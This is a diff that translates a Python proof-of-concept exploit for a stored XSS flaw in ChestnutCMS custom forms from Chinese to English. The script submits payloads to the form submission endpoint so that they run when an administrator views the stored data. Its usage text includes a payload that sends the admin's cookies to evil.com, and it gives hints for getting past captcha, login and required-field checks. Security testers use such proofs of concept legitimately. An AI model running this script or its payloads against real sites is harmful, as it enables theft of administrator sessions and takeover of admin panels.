@@ -1,36 +1,39 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PoC: ChestnutCMS 自定义表单存储型 XSS (Stored XSS)
-====================================================
+PoC: ChestnutCMS Custom Form Stored XSS
+=======================================
 
-漏洞概述
---------
-- 入口: POST /api/customform/submit
-- 根因: 后端对 controlType='UEditor' 的富文本字段不做任何 HTML 过滤
-        (CustomFormApiServiceImpl.submit -> ModelDataServiceImpl.saveModelData,
-         UEditor 控件类型沿用接口默认 valueAsString -> obj.toString())
-- 触发: 管理员后台「自定义表单数据」页面 data.vue 第 87 行
-        <div class="rich-content" v-html="scope.row[field.code]"></div>
-        直接渲染入库内容, 导致存储型 XSS, 可窃取管理员 Cookie / 劫持后台。
+Vulnerability Overview
+----------------------
+- Entry point: POST /api/customform/submit
+- Root cause: The backend applies no HTML filtering to rich-text fields whose
+              controlType='UEditor'
+              (CustomFormApiServiceImpl.submit -> ModelDataServiceImpl.saveModelData,
+               UEditor control type falls back to the default valueAsString -> obj.toString())
+- Trigger: Admin backend "Custom Form Data" page, data.vue line 87
+           <div class="rich-content" v-html="scope.row[field.code]"></div>
+           renders the stored content directly, leading to stored XSS that can
+           steal admin cookies / hijack the admin panel.
 
-授权声明
---------
-本脚本仅用于对自有/已获授权的 ChestnutCMS 部署进行安全测试与漏洞验证。
-禁止用于任何未授权目标。使用者自行承担一切法律责任。
+Authorization Notice
+--------------------
+This script is intended solely for security testing and vulnerability validation
+on ChestnutCMS deployments that you own or are authorized to test.
+Do not use it against any unauthorized target. The user bears all legal responsibility.
 
-依赖: pip install requests
+Dependency: pip install requests
 
-用法示例
---------
-# 1) 目标表单未开启验证码和登录 (最常见, 默认):
+Usage Examples
+--------------
+# 1) Target form without captcha and login (most common, default):
 python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content
 
-# 2) 自定义 XSS 载荷:
+# 2) Custom XSS payload:
 python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content \
     -p '<img src=x onerror=fetch("https://evil.com/c?"+document.cookie)>'
 
-# 3) 同时注入多个 UEditor 字段:
+# 3) Inject multiple UEditor fields at once:
 python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content -F remark
 """
 
@@ -41,11 +44,12 @@ import uuid as uuidlib
 try:
     import requests
 except ImportError:
-    sys.exit("[-] 缺少依赖 requests, 请先安装: pip install requests")
+    sys.exit("[-] Missing dependency 'requests', please install it first: pip install requests")
 
 # ---------------------------------------------------------------------------
-# 关键常量: 来自源码 CustomFormConsts.PARAMETER_UUID = "cc-uuid"
-# UUID 仅通过 header/参数 cc-uuid (或参数 uuid) 传递, 不读 Cookie、不读 body。
+# Key constant: from source CustomFormConsts.PARAMETER_UUID = "cc-uuid"
+# The UUID is passed only via header/parameter cc-uuid (or parameter uuid);
+# it is never read from Cookie or request body.
 # ---------------------------------------------------------------------------
 SUBMIT_PATH = "/api/customform/submit"
 
@@ -70,7 +74,7 @@ def err(msg):
 
 def submit(base_url, form_id, fields):
     """
-    提交表单数据。
+    Submit the form data.
     """
     url = base_url + SUBMIT_PATH
     headers = {
@@ -89,7 +93,7 @@ def submit(base_url, form_id, fields):
 
 
 def parse_field_args(field_args):
-    """解析 -F/--field 参数, 支持 'code' 或 'code:TYPE', 返回字段 code 列表。"""
+    """Parse -F/--field arguments. Supports 'code' or 'code:TYPE'; returns the list of field codes."""
     codes = []
     for fa in field_args:
         code = fa.split(":", 1)[0].strip()
@@ -100,20 +104,20 @@ def parse_field_args(field_args):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="ChestnutCMS 自定义表单存储型 XSS PoC (仅限测试)",
+        description="ChestnutCMS Custom Form Stored XSS PoC (testing only)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="示例: python poc_customform_xss.py -t http://localhost:9080 -f 1 -F content",
+        epilog="Example: python poc_customform_xss.py -t http://localhost:9080 -f 1 -F content",
     )
     parser.add_argument("-t", "--target", required=True,
-                        help="目标基础地址, 如 http://localhost:8080 (含站点前缀则一并带上)")
+                        help="Target base URL, e.g. http://localhost:8080 (include the site prefix if any)")
     parser.add_argument("-f", "--form-id", required=True, type=int,
-                        help="自定义表单 ID (formId)")
+                        help="Custom form ID (formId)")
     parser.add_argument("-F", "--field", action="append", required=True, metavar="CODE",
-                        help="UEditor 字段 code, 可多次指定向多个字段注入")
+                        help="UEditor field code; may be specified multiple times to inject multiple fields")
     parser.add_argument("-p", "--payload", default=DEFAULT_PAYLOAD,
-                        help="XSS 载荷 (默认弹窗探测)")
+                        help="XSS payload (default: alert probe)")
     parser.add_argument("--extra", action="append", default=[], metavar="CODE=VAL",
-                        help="附加普通字段(避免必填校验), 如 --extra name=test")
+                        help="Additional normal fields to bypass required validation, e.g. --extra name=test")
     args = parser.parse_args()
 
     base_url = args.target.rstrip("/")
@@ -123,49 +127,50 @@ def main():
     inject = {code: args.payload for code in field_codes}
     for kv in args.extra:
         if "=" not in kv:
-            err(f"--extra 格式应为 CODE=VAL: {kv}")
+            err(f"--extra format should be CODE=VAL: {kv}")
             sys.exit(1)
         k, v = kv.split("=", 1)
         inject[k] = v
 
     print("=" * 64)
-    print(" ChestnutCMS 自定义表单存储型 XSS PoC  (仅限授权测试)")
+    print(" ChestnutCMS Custom Form Stored XSS PoC  (authorized testing only)")
     print("=" * 64)
-    log(f"目标: {base_url}")
-    log(f"formId={args.form_id}  会话uuid={session_uuid}")
-    log(f"注入字段: {field_codes}")
-    log(f"载荷: {args.payload}")
+    log(f"Target: {base_url}")
+    log(f"formId={args.form_id}  session uuid={session_uuid}")
+    log(f"Inject fields: {field_codes}")
+    log(f"Payload: {args.payload}")
 
-    # ---- 提交恶意载荷 ----
+    # ---- Submit the malicious payload ----
     try:
         status, body = submit(base_url, args.form_id, inject)
     except Exception as e:
-        err(f"提交请求异常: {e}")
+        err(f"Submit request error: {e}")
         sys.exit(1)
 
-    log(f"HTTP {status}  响应: {body}")
+    log(f"HTTP {status}  response: {body}")
     code = body.get("code")
     msg = str(body.get("msg"))
 
     if code == 200:
         print()
-        ok("提交成功: 恶意载荷已写入数据库。")
-        ok("触发路径: 管理员登录后台 -> CMS -> 自定义表单 -> 数据管理 "
-           f"(formId={args.form_id}) -> 点击富文本字段的查看图标(眼睛) -> XSS 执行")
-        warn("如开启了 HttpOnly 的会话 Cookie, document.cookie 可能取不到; "
-             "可改用调用后台 API / 钓鱼等载荷验证执行。")
+        ok("Submit succeeded: the malicious payload has been written to the database.")
+        ok("Trigger path: admin logs into the backend -> CMS -> Custom Form -> Data Management "
+           f"(formId={args.form_id}) -> click the view icon (eye) on the rich-text field -> XSS executes")
+        warn("If session cookies are HttpOnly, document.cookie may be inaccessible; "
+             "use a payload that calls a backend API / phishing to verify execution.")
         sys.exit(0)
     else:
-        err(f"提交失败: code={code}, msg={msg}")
+        err(f"Submit failed: code={code}, msg={msg}")
+        # Keys match Chinese keywords returned by the server; values are user-facing hints.
         hints = {
-            "验证码": "验证码答案错误, 或表单已开启验证码需加 --captcha",
-            "captcha": "验证码答案错误, 或表单已开启验证码需加 --captcha",
-            "登录": "表单需要登录(needLogin=Yes), 需先取得会员登录凭证后再提交",
-            "必填": "存在必填字段被绕过, 请用 --extra 补齐",
+            "验证码": "Captcha answer is incorrect, or the form has captcha enabled, add --captcha",
+            "captcha": "Captcha answer is incorrect, or the form has captcha enabled, add --captcha",
+            "登录": "The form requires login (needLogin=Yes), obtain a member login credential first before submitting",
+            "必填": "A required field was bypassed, fill it in with --extra",
         }
         for k, v in hints.items():
             if k in msg:
-                warn("提示: " + v)
+                warn("Hint: " + v)
         sys.exit(1)
 
 
